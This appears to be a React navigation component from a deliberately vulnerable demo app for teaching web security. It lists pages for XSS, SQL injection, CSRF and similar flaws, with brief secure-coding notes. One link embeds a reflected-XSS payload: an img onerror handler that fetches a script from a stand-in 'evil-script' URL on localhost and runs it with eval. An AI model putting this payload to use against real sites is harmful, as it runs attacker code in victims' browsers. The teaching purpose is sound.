import React, { Component } from "react";
import {
    Link
} from "react-router-dom";
import './VulnerabilitiesList.css';


class VulnerabilitiesList extends Component {
    constructor(props) {
        super(props);
    }

    render() {
        let reflectedXss = "/reflected-xss?query=<img onerror='" +
            "var xmlHttp = new XMLHttpRequest(); " +
            "xmlHttp.onreadystatechange = function() {" +
            "    if (xmlHttp.readyState == XMLHttpRequest.DONE) {" +
            "        eval(xmlHttp.responseText);" +
            "    }" +
            "};" +
            "xmlHttp.open( \"GET\", \"http://localhost:8080/evil-script\", false ); " +
            "xmlHttp.send( null );" +
            "' src='invalid-image' />";

        return (
            <nav>

                <ul>
                    <h4>Main:</h4>
                    <li>
                        <Link to={reflectedXss}>Reflected XSS</Link>
                        <Link to="reflected-xss?query=cute pictures of cats">Normal usage</Link>
                    </li>
                    <li>
                        <Link to="/persistent-xss">Persistent XSS</Link>
                    </li>
                    <li>
                        <Link to="/sql-injection">SQL injection</Link>
                    </li>
                    <li>
                        <Link to="/csrf">CSRF</Link>
                    </li>
                    <li>
                        <Link to="/clickjacking">Clickjacking</Link>
                    </li>
                    <li>
                        <Link to="/brute-force">Vulnerability to Brute Force</Link>
                    </li>
                    <li>
                        <Link to="/insecure-object-reference">Insecure Direct Object References</Link>
                    </li>
                </ul>

                <ul>
                    <h4>Others:</h4>
                    <li>
                        Insecure Cryptographic Storage - sensitive data should be encrypted (passwords, credit cards..)
                    </li>
                    <li>
                        Insufficient Transport Layer Protection - should use https to avoid man-in-the-middle attack
                    </li>
                    <li>
                        CORS vulnerability - should not rely on CORS to prevent undesired requests, because it is enforced on the client side (browser). <br/>
                        Can be easily bypassed by alternative clients (curl/wget etc)
                    </li>
                    <li>
                        Remote code execution - should not use user input inside functions that are evaluating code
                    </li>
                    <li>
                        Components with vulnerabilities - should scan app dependencies, to check if there are any known vulnerabilities in them
                    </li>
                    <li>
                        Insufficient Logging & Monitoring - to detect attacks early you should securely log & monitor application
                    </li>
                    <li>
                        Insecure Deserialization - should not trust any data received from the client side (such as item price, discount, etc)
                    </li>
                    <li>
                        Information Leakage - should not leak any info about application (e.g. error stacks)
                    </li>
                </ul>
            </nav>
        );
    }
}

export default VulnerabilitiesList;
